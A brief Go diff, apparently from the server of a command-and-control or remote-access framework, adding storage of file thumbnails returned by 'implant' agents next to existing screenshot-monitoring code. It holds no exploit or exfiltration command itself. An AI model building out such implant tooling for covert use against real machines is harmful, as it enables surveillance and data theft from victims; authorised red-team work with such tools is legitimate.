@@ -259,6 +259,11 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			if s.IsScreenMonitoring(uuid) {
 				s.BroadcastScreenshot(uuid, r.Output)
 			}
+		} else if r.Type == "file_thumb" && r.Output != "" {
+			// Thumbnail bytes are written to data/thumbs and replaced with an
+			// opaque id in the task result; task rows must not become an
+			// alternate unbounded image store.
+			task.Result = s.storeFileThumbs(uuid, r.Output)
 		} else {
 			task.Result = decodeTaskResult(r.Type, r.Encoding, r.Output)
 		}
